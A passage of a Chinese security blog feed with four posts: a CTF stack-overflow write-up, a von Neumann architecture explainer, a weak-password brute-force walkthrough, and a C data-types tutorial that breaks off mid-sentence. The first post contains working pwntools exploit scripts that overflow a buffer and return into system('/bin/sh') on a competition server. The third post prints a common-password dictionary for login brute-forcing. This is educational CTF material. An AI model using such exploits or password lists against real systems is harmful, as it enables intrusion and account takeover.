    <title>【看雪CTF-pwn】一鸣惊人的栈溢出</title>
    <link href="https://muzibing.github.io/2020/07/04/2020.07.04%EF%BC%88134%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/04/2020.07.04（134）/</id>
    <published>2020-07-03T16:00:00.000Z</published>
    <updated>2020-07-04T14:37:00.456Z</updated>
    
    <content type="html"><![CDATA[<p>      这道题目真的太坑了，不过也给我提了一个醒，就是<code>在做题时不能对IDA pro反编译的伪代码过于相信</code>，在感觉有问题的地方，一定自己用<code>GDB</code>调试一下，否则就会陷入一个自我反省和懊恼的循环中，下面这道题目就是，下面我将用两种姿势来获取flag。</p><h3 id="font-color-navy0x00-准备工作font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-准备工作font"></a> <font color="navy"><code>0x00 准备工作</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># file ymjr </span><br><span class="line"></span><br><span class="line">ymjr: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f13f004f23ea39d28ca91f2bb83110b4b73713f, with debug_info, not stripped</span><br></pre></td></tr></table></figure><blockquote><p>可以看出该文件是32位的ELF文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># checksec ymjr </span><br><span class="line"></span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/Kanxue/1/pwn/YMJR/ymjr&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><blockquote><p>该ELF文件只开启了栈不可执行保护</p></blockquote><p><img src="/images/134-1.png" alt></p><blockquote><p>从上图的IDA中可以看出，gets()函数中的变量<code>v4</code>在栈中被分配的空间为<code>0x64</code>，但是在后面的exp.py文件中构造成功了，但是没有成功得到flag，于是我去gdb中调试了一下，如下图：</p></blockquote><p><img src="/images/134-2.png" alt></p><blockquote><p>从上图中可以看出，v4距<code>esp</code>的距离有<code>0x1c</code>，esp中的地址为<code>0xffffd860</code>，那么v4的地址为<code>0xffffd87c</code>。这个时候ebp中地址为<code>0xffffd8e8</code>，那么<code>v4</code>与<code>ebp</code>的距离为<code>0xffffd8e8-0xffffd87c=108（0x6c）</code>，示意图如下：</p></blockquote><p><img src="/images/134-3.png" alt></p><h3 id="font-color-navy0x01-姿势一font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-姿势一font"></a> <font color="navy"><code>0x01 姿势一</code></font></h3><blockquote><p>直接让返回地址跳转到<code>system(&quot;/bin/sh&quot;)</code>处</p></blockquote><p>     我们先看看程序中有没有可以直接利用的shell，在IDA中查找一下，发现在secure()函数中发现了<code>system(&quot;/bin/sh&quot;)</code>，如下图：</p><p><img src="/images/134-4.png" alt></p><p>      那么我们是否可以将main函数的返回地址填充为<code>system(&quot;/bin/sh&quot;)</code>函数的地址呢？下面我们来进行尝试我们开始写exp，不过请放心，我会详细的介绍每一步：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"221.228.109.254"</span>,<span class="number">10002</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">shell_addr = <span class="number">0x804863A</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把返回地址中填充secure_addr地址</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">108</span><span class="comment"># v4空间的填充</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">4</span><span class="comment"># old ebp的填充</span></span><br><span class="line">payload += p32(shell_addr)<span class="comment"># 返回地址填充为secure的地址</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"There is something amazing here, do you know anything?"</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>执行结果如下：</p></blockquote><p><img src="/images/134-5.png" alt></p><h3 id="font-color-navy0x02-姿势二font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-姿势二font"></a> <font color="navy"><code>0x02 姿势二</code></font></h3><p>      第二种姿势和第一种差不多，只不过是自己构造shell，需要我们自己查找字符串<code>/bin/sh</code>的地址，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ROPgadget --binary ymjr --string &quot;/bin/sh&quot;</span><br><span class="line"></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048763 : /bin/sh</span><br></pre></td></tr></table></figure><blockquote><p>exp如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"221.228.109.254"</span>,<span class="number">10002</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ymjr"</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">"system"</span>]</span><br><span class="line">bin_sh_addr = <span class="number">0x08048763</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把返回地址中填充secure_addr地址</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">108</span><span class="comment"># v4空间的填充</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">4</span><span class="comment"># old ebp的填充</span></span><br><span class="line">payload += p32(system_addr)<span class="comment"># 返回地址填充为secure的地址</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">4</span><span class="comment"># system函数的返回地址，我们并不管执行system函数以后的返回地址</span></span><br><span class="line">payload += p32(bin_sh_addr)<span class="comment"># system函数的参数/bin/sh的地址</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"There is something amazing here, do you know anything?"</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;      这道题目真的太坑了，不过也给我提了一个醒，就是&lt;code&gt;在做题时不能对IDA pro反编译的伪代码过于相信&lt;/code&gt;，在感觉有问题的地方，一定自己用&lt;code&gt;GDB&lt;/code&gt;调试一下，否则就会陷入一个自我反省和懊恼的循环中，下面这道题目就是，下面我将
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="看雪CTF" scheme="https://muzibing.github.io/tags/%E7%9C%8B%E9%9B%AACTF/"/>
    
  </entry>
  
  <entry>
    <title>【科普】冯·诺依曼结构与具体实现</title>
    <link href="https://muzibing.github.io/2020/07/03/2020.07.03%EF%BC%88133%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/03/2020.07.03（133）/</id>
    <published>2020-07-02T16:00:00.000Z</published>
    <updated>2020-07-03T07:24:55.662Z</updated>
    
    <content type="html"><![CDATA[<h4 id="font-color-navy1冯诺依曼计算的主要构成font"><a class="markdownIt-Anchor" href="#font-color-navy1冯诺依曼计算的主要构成font"></a> <font color="navy">1.冯·诺依曼计算的主要构成</font></h4><p>      冯·诺依曼计算机主要是由五大部分构成：</p><ol><li>运算器（CA）：Central Arithmetical</li><li>控制器（CC）：Central Contral</li><li>存储器（M）：Memory</li><li>输入设备（I）：Input</li><li>输出设备（O）：Output</li></ol><p>      除了上述五部分，还有一个<code>外部记录介质 R</code>(outside Recording medium)，示意图如下：</p><p><img src="/images/133-1.png" alt></p><blockquote><p>下面我们就来看看和具体实现是如何对应的呢？</p></blockquote><h4 id="font-color-navy2冯诺依曼结构原理与实现的对应font"><a class="markdownIt-Anchor" href="#font-color-navy2冯诺依曼结构原理与实现的对应font"></a> <font color="navy">2.冯·诺依曼结构原理与实现的对应</font></h4><p><img src="/images/133-2.png" alt></p><p>      如上图，它们一一对应关系如下：</p><blockquote><ul><li>CPU ⇢ 运算器 CA和控制器 CC</li><li>主存 ⇢ 存储器 M</li><li>键盘 ⇢ 输入设备 I</li><li>硬盘、显示器 ⇢  输出设备</li></ul></blockquote><p>      在这里要说明的是主板上的<code>北桥</code>、<code>南桥</code>和<code>BIOS</code>三个部件</p><p><code>北桥</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在主板上，CPU是如何获取指令并去执行的呢？上图的主板上采取了南北桥结构，CPU对外会连接一块芯片北桥，CPU想要访问主存，就必须通过北桥芯片。</span><br></pre></td></tr></table></figure><p><code>南桥</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在北桥下方有一块芯片，叫做南桥，南桥内部集成了很多输入输出设备的控制器，其中就包括硬盘的控制器，也就是说硬盘实际上就是和南桥相连的。</span><br></pre></td></tr></table></figure><p><code>BIOS</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">要注意，计算机刚启动时，主存中是没有信息的，因为断电后主存的信息都会丢失，这是RAM的一个特性，那么系统启动以后，CPU从什么地方获取指令呢？</span><br><span class="line">是否是从硬盘中取得呢？不是的，因为从硬盘访问数据相对比较复杂，那么实际上在主板上还有一个很小的芯片，它与南桥相连，一般称之为BIOS（Base Input Output System）芯片，该芯片存储容量很小，会保存一段比较简单但是比较重要的程序，包括检查主板上都有哪些设备，并且检查这些设备是否工作正常，这个芯片实际上是一个只读存储器（ROM），当断电后BIOS芯片中的数据是不会丢失的，但是从冯·诺依曼结构上来看，它并不属于存储器的范畴，而是和硬盘一样属于外部记录介质R，所以当计算机启动后，CPU会一次通过北桥 -&gt; 南桥，访问到BIOS芯片，从中取得指令。</span><br><span class="line">CPU从BIOS芯片中取得指令后，会依次检查主板上的各个设备，包括是否有显卡，通过显卡连接显示器，检查键盘的存在</span><br></pre></td></tr></table></figure><p>      目前显卡的功能越来越复杂，性能也越来越强大，尤其是其中的图形处理单元（GPU），GPU往往也可以进行复杂的数学计算，拥有很强的运算能力，有时候也让GPU承担一些运算的工作，实际上在高性能的运算中会采用大量的GPU来进行运算，从这个意义上将GPU也承担了运算器和控制器的一些功能。而南北桥也在迅速的发生变化。</p><h4 id="font-color-navy3南北桥架构的演变font"><a class="markdownIt-Anchor" href="#font-color-navy3南北桥架构的演变font"></a> <font color="navy">3.南北桥架构的演变</font></h4><p><code>演变（1）</code></p><p><img src="/images/133-3.png" alt></p><p>      上图还是刚才的主板。我们先来看图中右侧部分，最上方是CPU，其中往往包含很多CPU核；向下CPU连接的是北桥，北桥中主要有主存控制器—对外连接主存，现在的显卡一般采用PCIe接口，所以在北桥中有一个PCIe控制器，对外通过PCIe插槽连接PCIe显卡，当然对显存的要求不高，可以通过北桥的集成显卡直接连接显示器；北桥还连接着南桥，南桥中集中了大多数I/O设备的控制器。</p><p>      下面再来看左侧部分，红色箭头部分表示传输压力很大，而绿色部分表示传输压力较小，在这种情况下，最主要解决对性能影响最大的关键问题，就是<code>CPU访问主存的通道</code>，所以在南北桥上发生的第一个变化如下。</p><p><code>演变（2）</code></p><p><img src="/images/133-4.png" alt></p><p>      如上图，在南北桥上发生的第一个变化，就是<strong>北桥的主控制器被移到了CPU芯片中</strong>，从图中可以看到，CPU卡槽离主存卡槽更近，这是因为现在CPU是直接访问主存的，而不需要再通过访问北桥了，这样大大提高了数据传输率，现在显示的通道就成为了要解决的下一个问题。</p><p><code>演变（3）</code></p><p><img src="/images/133-5.png" alt></p><p>     如上图，在最新的个人计算机的CPU设计中，不仅包含了主存控制器，还包含了PCIe控制器，在外部可以直接连接显卡，这样北桥的的重要部件都被集成到了CPU中，那么北桥就没有存在的必要了，于是将北桥剩余的一些功能整合到南桥中，那么所谓南北桥架构已经消失了，由于没有北桥，那么南桥的名字也显得奇怪了，所以往往有一些不同的名字，比如PCH等。这样就将大部分通过主板连接的线路，集成到了CPU内部，这样就大大的提升了系统的性能。</p><p><code>演变（4）</code></p><p><img src="/images/133-6.png" alt></p><p>      什么是系统芯片呢？系统芯片<code>就是将计算机或其他电子系统集成为单一芯片的集成电路</code>，这种芯片在智能手机、平板电脑等移动计算设备上得到了广泛应用。下面要提的是一个著名定理<code>摩尔定律</code></p><h4 id="font-color-navy4摩尔定律font"><a class="markdownIt-Anchor" href="#font-color-navy4摩尔定律font"></a> <font color="navy">4.摩尔定律</font></h4><p><code>摩尔定律原型</code></p><p>      1965年，摩尔在《电子学》杂志上预测：<code>在最低元件价格下，集成电路的复杂度每年大约增加一倍，这一增长率至少可以维持十年</code>。这就是摩尔定律的原型。但是于1967年，摩尔调整了预测，<code>在最低元件价格下，集成电路的复杂度每两年增加一倍，这一增长率至少可以维持十年</code>。</p><p><code>现在摩尔定律的描述</code></p><p>      现在摩尔定律常被描述为：<code>当价格不变时，集成电路上可容纳的晶体管数目，约每隔18个月便会增加一倍，性能也将提升一倍</code>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;font-color-navy1冯诺依曼计算的主要构成font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy1冯诺依曼计算的主要构成font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;1.冯·诺依
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>【web安全】爆破用户登录弱口令</title>
    <link href="https://muzibing.github.io/2020/07/01/2020.07.01%EF%BC%88132%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/01/2020.07.01（132）/</id>
    <published>2020-06-30T16:00:00.000Z</published>
    <updated>2020-07-01T08:04:31.897Z</updated>
    
    <content type="html"><![CDATA[<p>     前一段时间一直在做pwn方向的题目，以后的要开始同时兼顾，为准备打各种CTF比赛做准备，同时也是提升自己的安全知识能力和技术。今天就用一道简单的web题目来引出该主题，大家一般在设置密码时，为了方便，有的人就随便设置密码比如<code>123456789</code>、<code>88888888</code>等，大家也许知道这样的密码是不安全的，但是并不清楚为什么不安全。今天我就带着大家的疑问，来和大家讲一下<font color="navy"><code>弱口令</code></font>为什么不安全的。</p><p><code>情景假设</code></p><blockquote><p>加入小明自己写了一个登陆系统，如下图，他在设置管理员密码时，随便输入一串字符串。这里我们并不知道这个密码是多少，下面看一下我们是否能登录该系统。</p></blockquote><p><img src="/images/132-1.png" alt></p><h4 id="font-color-navy1创建字典font"><a class="markdownIt-Anchor" href="#font-color-navy1创建字典font"></a> <font color="navy">1.创建字典</font></h4><p>     情境中给出了说明：随便输了一串字符串。那我们先假设这段字符串很简单，我们根据人们常用的密码创建一个密码字典，以备我们后面使用，字典部分内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">123456789</span><br><span class="line">a123456</span><br><span class="line">123456</span><br><span class="line">a123456789</span><br><span class="line">1234567890</span><br><span class="line">woaini1314</span><br><span class="line">qq123456</span><br><span class="line">abc123456</span><br><span class="line">123456a</span><br><span class="line">123456789a</span><br><span class="line">147258369</span><br><span class="line">zxcvbnm</span><br><span class="line">987654321</span><br><span class="line">12345678910</span><br><span class="line">abc123</span><br><span class="line">qq123456789</span><br><span class="line">123456789.</span><br><span class="line">7708801314520</span><br><span class="line">woaini</span><br><span class="line">5201314520</span><br><span class="line">q123456</span><br><span class="line">123456abc</span><br><span class="line">1233211234567</span><br><span class="line">123123123</span><br><span class="line">123456.</span><br><span class="line">0123456789</span><br><span class="line">asd123456</span><br><span class="line">aa123456</span><br><span class="line">135792468</span><br><span class="line">q123456789</span><br><span class="line">abcd123456</span><br><span class="line">12345678900</span><br><span class="line">woaini520</span><br><span class="line">woaini123</span><br><span class="line">zxcvbnm123</span><br><span class="line">1111111111111111</span><br><span class="line">w123456</span><br><span class="line">aini1314</span><br><span class="line">abc123456789</span><br><span class="line">111111</span><br><span class="line">woaini521</span><br><span class="line">qwertyuiop</span><br><span class="line">1314520520</span><br><span class="line">1234567891</span><br><span class="line">qwe123456</span><br><span class="line">asd123</span><br><span class="line">000000</span><br><span class="line">1472583690</span><br><span class="line">1357924680</span><br><span class="line">789456123</span><br><span class="line">123456789abc</span><br><span class="line">z123456</span><br><span class="line">1234567899</span><br></pre></td></tr></table></figure><h4 id="font-color-navy2爆破密码font"><a class="markdownIt-Anchor" href="#font-color-navy2爆破密码font"></a> <font color="navy">2.爆破密码</font></h4><p>      在这里我们要用到一个抓包工具<code>Burp Suit</code>（666666），它长下面这个样子：</p><p><img src="/images/132-2.png" alt></p><p>      下面我用动图R的形式来展示一下爆破的整个过程：</p><p><img src="/images/132-3.gif" alt></p><blockquote><p>可以从上图中看出，管理员密码为<code>123456</code>，所以说通过这个简单的例子可以看出，我们平常在设置密码时尽量不要用弱口令，尽量使用字母、数字和符号的混合字符串，以保证我们账户的安全性。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;     前一段时间一直在做pwn方向的题目，以后的要开始同时兼顾，为准备打各种CTF比赛做准备，同时也是提升自己的安全知识能力和技术。今天就用一道简单的web题目来引出该主题，大家一般在设置密码时，为了方便，有的人就随便设置密码比如&lt;code&gt;123456789&lt;/cod
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
  </entry>
  
  <entry>
    <title>【C语言学习系列二】 C语言中的基本数据类型</title>
    <link href="https://muzibing.github.io/2020/06/26/2020.06.24%EF%BC%88131%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/26/2020.06.24（131）/</id>
    <published>2020-06-25T16:00:00.000Z</published>
    <updated>2020-06-26T11:00:38.420Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-基本数据类型font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-基本数据类型font"></a> <font color="navy"><code>0x00 基本数据类型</code></font></h3><p><img src="/images/131-1.png" alt></p><table><thead><tr><th style="text-align:center"><font size="2">基本类型</font></th><th style="text-align:center"><font size="2">字节</font></th><th style="text-align:center"><font size="2">范围</font></th></tr></thead><tbody><tr><td style="text-align:center"><font size="2">char</font></td><td style="text-align:center"><font size="2">1byte</font></td><td style="text-align:center"><font size="2">—</font></td></tr><tr><td style="text-align:center"><font color="navy" size="2">short</font></td><td style="text-align:center"><font size="2">2bytes</font></td><td style="text-align:center"><font size="2">0~32767(0~0x7fff)<br>-32768~-1(0x8000~0xffff)</font></td></tr><tr><td style="text-align:center"><font size="2">int</font></td><td style="text-align:center"><font size="2">4bytes</font></td><td style="text-align:center"><font size="2">0~2147483647(0~0x7fffffff)<br>-2147483648~-1(0x80000000~0xffffffff)</font></td></tr><tr><td style="text-align:center"><font size="2">unsigned int</font></td><td style="text-align:center"><font size="2">4bytes</font></td><td style="text-align:center"><font size="2">0~4294967295(0~0xffffffff)</font></td></tr><tr><td style="text-align:center"><font size="2">long int</font></td><td style="text-align:center"><font size="2">8bytes</font></td><td style="text-align:center"><font size="2">正: 0~0x7fffffffffffffff<br>负: 0x8000000000000000~0xffffffffffffffff</font></td></tr><tr><td style="text-align:center"><font size="2">unsigned long int</font></td><td style="text-align:center"><font size="2">8bytes</font></td><td style="text-align:center"><font size="2">0~0xffffffffffffffff</font></td></tr><tr><td style="text-align:center"><font size="2">float</font></td><td style="text-align:center"><font size="2">4bytes</font></td><td style="text-align:center"><font size="2">|3.4e-38|~|3.4e+38|</font></td></tr><tr><td style="text-align:center"><font size="2">double</font></td><td style="text-align:center"><font size="2">8bytes</font></td><td style="text-align:center"><font size="2">|1.7e-308|~|1.7e+308|</font></td></tr></tbody></table><blockquote><p>下面我们用一个示例代码打印一下这些基本的数据类型，代码如下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Function: 打印基本数据类型的字节数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of char is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of short is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">short</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of int is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of long int is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">int</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of float is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">float</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of double is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">double</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>运行结果如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">The size of char is 1 bytes</span><br><span class="line">The size of short is 2 bytes</span><br><span class="line">The size of int is 4 bytes</span><br><span class="line">The size of long int is 4 bytes</span><br><span class="line">The size of float is 4 bytes</span><br><span class="line">The size of double is 8 bytes</span><br></pre></td></tr></table></figure><blockquote><p><font size="2">需要说明的是上述程序的运行环境为32位，所以long的字节数是4bytes，而在64位环境下则为8bytes</font></p></blockquote><h4 id="font-color-blue-1有符号和无符号font"><a class="markdownIt-Anchor" href="#font-color-blue-1有符号和无符号font"></a> <font color="blue"><code>1.有符号和无符号</code></font></h4><p>      对于有符号和无符号数据类型这块，我想首先用一个问题来引出这部分的重点内容——<code>计算机怎么知道数值是有符号的还是无符号的呢？</code>众所周知，数值在计算机内部的存储方式是以<code>0 1</code>方式进行存储的，比如数值<code>4</code>在16位环境下的存储形式为<code>0000 0000 0000 0100</code>，很简单就能知道这是一个正数4，那么如果存储的是<code>-4</code>呢？（<font color="green" size="2">大家思考一下负数在内存的存储方式</font>），要知道<code>-4</code>在内存是以它的补码形式进行存储的，首先来看<code>-4</code>从原码到补码的转变：<code>1</code> <code>000 0100</code> <font size="2">（原码）</font>⇥ <code>1</code> <code>111 1011</code><font size="2">（反码）</font>⇥ <code>1</code> <code>111 1100</code> <font size="2">（补码）</font>，那么<code>-4</code>在内存的存储形式为<code>0xfc</code>，下面我们可以看一下32位环境下的无符号和有符号定义下<code>-4</code>和<code>4</code>的存储形式，是否和我们推导的一致呢？如下图：</p><p><img src="/images/131-2.png" alt></p><p>      从上图可以看出对于有符号数值是以数值的补码形式进行存储的，但是对于无符号下的负数是什么原因呢？这是因为你前面加上符号之后，相当于把变量提升为有符号类型，所以和正常的有符号下的存储是一样的。</p><blockquote><p><font color="red"><strong>知识点一</strong></font>：无论是整数和负数，在计算机内部都是以它们的补码的形式进行存储的。</p></blockquote><p>     这里通过一个简单的程序引出下面的问题，程序如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">2147483649</span>, usum;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">1</span>, sum;</span><br><span class="line">        usum = i + j;</span><br><span class="line">    sum = i + j;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usum = 214783649 + 1 = %d (d)\n"</span>,usum);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usum = 214783649 + 1 = %u (u)\n"</span>,usum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sum = 214783649 + 1 = %d (d)\n"</span>,sum);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"sum = 214783649 + 1 = %u (u)\n"</span>,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在看下方结果之前，大家先思考一下应该是什么结果？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usum = 214783649 + 1 = -2147483646 (d)</span><br><span class="line">usum = 214783649 + 1 = 2147483650 (u)</span><br><span class="line">sum = 214783649 + 1 = -2147483646 (d)</span><br><span class="line">sum = 214783649 + 1 = 2147483650 (u)</span><br></pre></td></tr></table></figure><blockquote><p>看到上面的输出结果，我猜大家可能会有这样的问题：</p><ul><li>i和j都是正数，两个数相加之后怎么成负数了？</li><li>为什么格式符不同，输出的结果也不通呢？</li><li>usum是<code>unsigned int</code>类型，怎么成为了负数呢？</li></ul><p>下面我们一步一步的来进行解析。</p></blockquote><p>      首先我们知道了数值在机器内存是以补码的形式进行存储的，那么对于两个数相加机器是怎么处理的呢？在汇编层次，一般通过<code>add eax,edx</code>进行的，其中将<code>eax</code>和<code>edx</code>中的二进制相加，然后把结果存储到寄存器<code>eax</code>中，所以说<code>214783649 + 1</code>对于机器来说只不过是将这两个的二进制形式相加而已，关于补码加减运算应该要注意的是：负数的求反码和补码过程符号位是不参与计算的，要取出来，只有在进行负数补码的加减法的时候<code>符号位</code>才参与计算<sup>[1]</sup></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   214783649     1000 0000 0000 0000 0000 0000 0000 0001</span><br><span class="line">+          1   +0000 0000 0000 0000 0000 0000 0000 0001</span><br><span class="line">-------------   -----------------------------------------</span><br><span class="line">   ?&lt;=  1000 0000 0000 0000 0000 0000 0000 0010</span><br></pre></td></tr></table></figure><blockquote><p>关键的要来了，机器会把<code>1000 0000 0000 0000 0000 0000 0000 0010</code>看做什么呢？</p><ul><li>如果是有符号的话，则它的原码为<code>1111 1111 1111 1111 1111 1111 1111 